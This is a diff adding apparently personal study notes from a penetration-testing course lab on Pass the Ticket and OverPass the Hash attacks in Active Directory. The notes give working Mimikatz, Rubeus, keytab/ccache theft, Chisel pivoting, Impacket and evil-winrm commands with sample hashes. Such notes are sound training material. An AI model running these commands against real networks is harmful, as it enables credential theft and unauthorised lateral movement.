@@ -1,0 +1,407 @@
+
+    Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. We'll cover several ways to perform a PtT attack from Windows and Linux.
+
+
+
+                ///Windows
+
+
+
+    We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:
+
+    Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
+    Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
+
+    Before we perform a Pass the Ticket (PtT) attack, let's see some methods to get a ticket using Mimikatz and Rubeus.
+
+
+
+    //Mimikatz - Export Tickets
+
+
+    On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.
+
+    We can harvest all tickets from a system using the Mimikatz module sekurlsa::tickets /export. The result is a list of files with the extension .kirbi, which contain the tickets.  
+
+
+    The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.
+
+    Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
+
+    
+    
+    //Rubeus - Export Tickets
+
+    
+    We can also export tickets using Rubeus and the option dump. This option can be used to dump all tickets (if running as a local administrator). Rubeus dump, instead of giving us a file, will print the ticket encoded in base64 format. We are adding the option /nowrap for easier copy-paste.
+
+    Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.
+
+
+    c:\tools> Rubeus.exe dump /nowrap
+
+    This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the OverPass the Hash or Pass the Key technique.
+
+
+            
+            //Pass the Key or OverPass the Hash
+
+
+    The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT)
+
+
+    To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.
+
+    //Mimikatz - Extract Kerberos Keys
+
+    mimikatz # sekurlsa::ekeys
+
+    Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.
+
+    //Mimikatz - Pass the Key or OverPass the Hash
+
+    mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+
+
+    This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.
+
+
+    To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.
+
+    //Rubeus - Pass the Key or OverPass the Hash
+
+    c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+
+    Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
+
+
+    Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade." 
+
+
+
+    //Pass the Ticket (PtT)
+
+
+    With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.
+
+    c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext  /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+
+    Note that now it displays Ticket successfully imported!.
+
+    Another way is to import the ticket into the current session using the .kirbi file from the disk.
+
+    Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.
+
+
+    //Rubeus - Pass the Ticket
+
+    c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+
+
+    /Convert .kirbi to Base64 Format
+
+    We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.
+
+    PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
+
+
+    Pass the Ticket - Base64 Format
+
+    c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
+
+
+    //Mimikatz - Pass the Ticket
+    
+
+    Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.
+
+
+    mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+
+
+
+
+    Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.
+
+
+
+            ///Pass The Ticket with PowerShell Remoting (Windows)
+
+
+    PowerShell Remoting allows us to run scripts or commands on a remote computer. Administrators often use PowerShell Remoting to manage remote computers on the network. Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.
+
+    To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.
+
+    Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.
+
+
+
+    ///Mimikatz - PowerShell Remoting with Pass the Ticket
+
+
+    To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new cmd.exe and execute mimikatz.exe, then import the ticket we collected using sekurlsa::tickets /export. Once the ticket is imported into our cmd.exe session, we can launch a PowerShell command prompt from the same cmd.exe and use the command Enter-PSSession to connect to the target machine.
+
+
+    mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+
+    mimikatz # exit
+
+    c:\tools>powershell
+
+    PS C:\tools> Enter-PSSession -ComputerName DC01
+
+
+
+    //Rubeus - PowerShell Remoting with Pass the Ticket
+
+    Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9). The process is hidden by default, but we can specify the flag /show to display the process, and the result is the equivalent of runas /netonly. This prevents the erasure of existing TGTs for the current logon session.
+
+    C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+
+
+
+    The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.
+
+
+    C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+
+
+
+
+                    ////PTH from Linux
+
+
+    
+    Note: A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.
+
+
+    In most cases, Linux machines store Kerberos tickets as ccache files in the /tmp directory. By default, the location of the Kerberos ticket is stored in the environment variable KRB5CCNAME. This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed. These ccache files are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.
+
+    Another everyday use of Kerberos in Linux is with keytab files. A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files.
+
+    Keytab files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file. For example, a script can use a keytab file to access files stored in the Windows share folder.
+
+    Note: Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.
+
+
+
+
+    We can identify if the Linux machine is domain join using realm, a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.
+
+    $ realm list
+
+    In case realm is not available, we can also look for other tools used to integrate Linux with Active Directory such as sssd or winbind. Looking for those services running in the machine is another way to identify if it is domain joined.
+
+    //PS - Check if Linux Machine is Domain Joined
+
+
+    $ ps -ef | grep -i "winbind\|sssd"
+
+
+        //Finding Kerberos Tickets in Linux
+
+    
+    //Finding Keytab Files
+
+
+    ~$ find / -name *keytab* -ls 2>/dev/null
+
+    Note: To use a keytab file, we must have read and write (rw) privileges on the file.
+
+    
+    
+    //Identifying Keytab Files in Cronjob
+
+    $ crontab -l
+    kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
+    mbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
+
+
+    In the above script, we notice the use of kinit, which means that Kerberos is in use. kinit allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use kinit to import a keytab into our session and act as the user.
+
+
+    a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at /etc/krb5.keytab and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB
+
+
+
+        //Finding ccache Files
+
+    A credential cache or ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the KRB5CCNAME environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data. Let's look for the environment variables and identify the location of our Kerberos credentials cache:
+
+    $ env | grep -i krb5
+
+
+        //Abusing KeyTab Files
+
+    The first thing we can do is impersonate a user using kinit. To use a keytab file, we need to know which user it was created for. klist is another application used to interact with Kerberos on Linux. This application reads information from a keytab file. Let's see that with the following command:
+
+    //Listing keytab File Information
+
+    $ klist -k -t 
+
+    Note: kinit is case-sensitive, so be sure to use the name of the principal as shown in klist. 
+
+
+    //Impersonating a User with a keytab
+
+    $ klist
+
+    $ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+
+    $ klist 
+
+    $ smbclient //dc01/carlos -k -c ls
+
+    Note: To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable KRB5CCNAME.
+
+
+    ///Keytab Extract
+
+    The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.
+
+    We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use KeyTabExtract, a tool to extract valuable information from 502-type .keytab files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.
+
+    (https://github.com/sosdave/KeyTabExtract)
+
+    $ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
+
+    With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.
+
+    Note: A keypass file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
+
+
+
+            //Abusing Keytab ccache
+
+
+    !!!!Linux machine file for krb authentication could be /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+    
+
+    To abuse a ccache file, all we need is read privileges on the file. These files, located in /tmp, can only be read by the user who created them, but if we gain root access, we could use them.
+
+    Note: klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. ccache files are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
+
+    root@linux01:~# klist
+
+    root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
+
+    root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+
+    root@linux01:~# klist
+
+
+    Note: klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. ccache files are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
+
+
+            //Using Linux Attack Tools with Kerberos
+
+    If our attack host doesn't have a connection to the KDC/Domain Controller, and we can't use the Domain Controller for name resolution, we need to proxy our traffic via MS01 with a tool such as Chisel and Proxychains and edit the /etc/hosts file to hardcode IP addresses of the domain and the machines we want to attack.
+
+
+    We need to modify our proxychains configuration file to use socks5 and port 1080.
+
+    $ cat /etc/proxychains.conf
+
+
+    $ cat /etc/proxychains.conf
+
+    <SNIP>
+
+    [ProxyList]
+    socks5 127.0.0.1 1080
+
+
+    We must  execute chisel on our attack host.
+
+    --Execute chisel from MS01
+
+    C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
+
+    Note: The client IP is your attack host IP.
+
+    
+    Finally, we need to transfer Julio's ccache file from LINUX01 and create the environment variable KRB5CCNAME with the value corresponding to the path of the ccache file.
+
+
+
+    --Setting the KRB5CCNAME Environment Variable
+
+
+    $ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+
+    
+
+    ///Using Impacket with proxychains and Kerberos Authentication
+
+    To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.
+
+    $ proxychains impacket-wmiexec ms01 -k
+
+
+
+
+    Note: If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
+
+
+
+    ///Evil-Winrm
+
+    To use evil-winrm with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called krb5-user While installing, we'll get a prompt for the Kerberos realm.
+
+    //Installing Kerberos Authentication Package
+
+    $ sudo apt-get install krb5-user -y
+
+
+    !!!In case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.conf to include the following values:
+
+
+        $ cat /etc/krb5.conf
+
+        [libdefaults]
+                default_realm = INLANEFREIGHT.HTB
+
+        <SNIP>
+
+        [realms]
+            INLANEFREIGHT.HTB = {
+                kdc = dc01.inlanefreight.htb
+            }
+
+        <SNIP>
+
+
+
+    $ proxychains evil-winrm -i dc01 -r inlanefreight.htb
+
+
+
+    If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use impacket-ticketConverter to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.
+
+    ///Impacket Ticket Converter
+
+    $ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+
+    We can do the reverse operation by first selecting a .kirbi file. Let's use the .kirbi file in Windows.
+
+
+    //Importing Converted Ticket into Windows Session with Rubeus
+
+
+    C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+
+
+
+                ///Linikatz
+
+    Linikatz is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to Mimikatz to UNIX environments.
+
+    Just like Mimikatz, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with linikatz.. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.
+
+
+
+    
+
+
+
+
